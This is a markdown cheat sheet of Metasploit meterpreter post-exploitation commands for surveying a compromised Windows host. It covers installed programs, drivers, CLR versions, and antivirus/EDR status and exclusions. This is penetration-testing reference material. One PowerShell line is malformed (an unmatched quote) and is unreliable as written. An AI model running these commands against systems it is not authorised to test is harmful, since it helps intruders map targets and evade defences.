---
author(s):
  - Userware
tags:
  - post-exploitation
  - enumeration-and-discovery
  - metasploit-framework
  - windows
---
# Metasploit

## 01 - Installed Programs

TODO: Convert the manual methods to meterpreter

### 1.1 - List Installed Software

```
meterpreter > run post/windows/gather/enum_applications

meterpreter > run post/multi/gather/enum_software_versions

meterpreter > run post/windows/gather/enum_chocolatey_applications
```

Enumerate OneDrive

```
meterpreter > run post/windows/gather/enum_onedrive
```

### 1.2 - List directories including hidden files and folders

```
meterpreter > ls -R "C:\Program Files"

meterpreter > ls -R "C:\Program Files (x86)"
```

### 1.3 - Find a specific program

File Explorer

```
meterpreter > ls -RS "explorer.exe" C:\\

meterpreter > search -d C:\\ -f explorer.exe
```

Internet Explorer

```
meterpreter > ls -RS "iexplore.exe" C:\\

meterpreter > search -d C:\\ -f iexplore.exe
```

Java Updater

```
meterpreter > ls -RS "jucheck.exe" C:\\

meterpreter > search -d C:\\ -f jucheck.exe
```

Find MSBuild C# compiler versions

```
meterpreter > ls -RS "MSBuild.exe" C:\\

meterpreter > search -d C:\\ -f MSBuild.exe

meterpreter > ls -R %WINDIR%\Microsoft.NET\Framework64

meterpreter > ls %WINDIR%\Microsoft.NET\Framework64\v*
```

## 02 - PowerShell and .NET

Enumerate available Common Language Runtime (CLR) versions.

```
meterpreter > ls -RS "System.dll" %windir%\Microsoft.Net\Framework\
```

## 03 - Device Drivers

### 3.1 - Meterpreter Command

```
meterpreter > execute -Hicf driverquery.exe -a "[/s <IP>] [/u [<DOMAIN>\]username>] [/p <password>] [/v] /fo list"

meterpreter > execute -Hicf driverquery.exe -a "[/s <IP>] [/u [<DOMAIN>\]username>] [/p <password>] /fo table"

meterpreter > execute -Hicf driverquery.exe -a "[/s <IP>] [/u [<DOMAIN>\]username>] [/p <password>] --no-msft"
```

### 3.2 - PowerShell Extension

```
meterpreter > powershell_execute 'driverquery.exe [/s <IP>] [/u [<DOMAIN>\]username>] [/p <password>] /v /fo csv | ConvertFrom-CSV | Select-Object "Display Name", Start Mode", Path'
```

## 04 - Antivirus and EDR

```
meterpreter > service_query WinDefend

meterpreter > run post/windows/gather/enum_av
```

Retrieve exclusions of Windows Security and other antiviruses.

```
meterpreter > run post/windows/gather/enum_av_excluded
```

---
## References

- [[04 - PowerShell|Metasploit: Powershell Meterpreter Extension]]

- [Rapid7: Metasploit Framework - Enumerate AV Gather Post Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/enum_av.md)